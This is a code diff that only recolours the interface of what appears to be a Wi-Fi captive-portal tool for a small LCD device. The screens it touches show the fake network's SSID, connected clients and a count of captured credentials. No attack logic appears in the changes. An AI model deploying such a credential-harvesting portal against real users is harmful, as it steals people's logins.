@@ -116,7 +116,7 @@ display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0
 .box{background:#16213e;padding:30px;border-radius:12px;
 box-shadow:0 4px 20px rgba(0,0,0,.4);max-width:380px;width:90%}
 h2{margin-top:0;color:#e94560}
-input{width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;
+input{width:100%;padding:12px;margin:8px 0;border:1px solid #8b0000;
 border-radius:6px;box-sizing:border-box;background:#1a1a2e;color:#fff}
 button{width:100%;padding:14px;background:#e94560;color:#fff;border:none;
 border-radius:6px;cursor:pointer;font-size:16px;margin-top:10px}
@@ -519,7 +519,7 @@ def draw_menu():
     d.rectangle((0,0,W,17), fill="#8B0000")
     d.text((4,3), "CAPTIVE PORTAL", font=f9, fill=(231, 76, 60))
     tag = "[ON]" if portal_running else "[OFF]"
-    d.text((90,3), tag, font=f9, fill=(30, 132, 73) if portal_running else "#FF4444")
+    d.text((90,3), tag, font=f9, fill=(231, 76, 60) if portal_running else "#FF4444")
     y = 20
     for i, item in enumerate(MENU_ITEMS):
         if i == menu_idx:
@@ -542,13 +542,13 @@ def draw_status():
     portal = cfg.get("selected_portal", "") or "built-in"
     creds = _count_creds()
     y = 20
-    d.text((4, y), f"Service: {'RUNNING' if portal_running else 'STOPPED'}", font=f9, fill=(30, 132, 73) if portal_running else "#FF4444"); y+=12
+    d.text((4, y), f"Service: {'RUNNING' if portal_running else 'STOPPED'}", font=f9, fill=(231, 76, 60) if portal_running else "#FF4444"); y+=12
     d.text((4, y), f"SSID: {ssid[:16]}", font=f9, fill=(171, 178, 185)); y+=12
     d.text((4, y), f"Portal: {portal[:16]}", font=f9, fill=(171, 178, 185)); y+=12
     d.text((4, y), f"Clients: {clients_connected}", font=f9, fill=(171, 178, 185)); y+=12
     d.text((4, y), f"Creds: {creds}", font=f9, fill=(212, 172, 13)); y+=12
     d.text((4, y), f"IP: {GATEWAY_IP}", font=f9, fill=(113, 125, 126)); y+=12
-    d.text((4, y), status_msg[:22], font=f9, fill=(30, 132, 73))
+    d.text((4, y), status_msg[:22], font=f9, fill=(231, 76, 60))
     d.rectangle((0, H-12, W, H), fill="#220000")
     d.text((4, H-10), "K3=Back", font=f9, fill="#FF7777")
     LCD.LCD_ShowImage(img, 0, 0)
@@ -571,7 +571,7 @@ def draw_select_portal():
         for i, name in enumerate(portals[scroll_pos:scroll_pos+7]):
             sel = (scroll_pos + i) == scroll_pos
             active = (name == current)
-            color = "#00FF00" if active else ("#FFBBBB" if sel else "#AAAAAA")
+            color = "#E74C3C" if active else ("#FFBBBB" if sel else "#AAAAAA")
             prefix = "> " if sel else "  "
             star = "*" if active else " "
             d.text((4, y), f"{prefix}{star}{name[:18]}", font=f9, fill=color)
@@ -629,7 +629,7 @@ def draw_ssid_editor(current_ssid):
     d.text((4,3), "EDIT SSID", font=f9, fill=(231, 76, 60))
     d.text((4,25), f"Current: {current_ssid[:20]}", font=f9, fill=(171, 178, 185))
     d.text((4,45), "Use keyboard helper", font=f9, fill=(171, 178, 185))
-    d.text((4,60), "Press OK to edit", font=f9, fill=(30, 132, 73))
+    d.text((4,60), "Press OK to edit", font=f9, fill=(231, 76, 60))
     d.rectangle((0, H-12, W, H), fill="#220000")
     d.text((4, H-10), "OK:Edit  K3:Cancel", font=f9, fill="#FF7777")
     LCD.LCD_ShowImage(img, 0, 0)
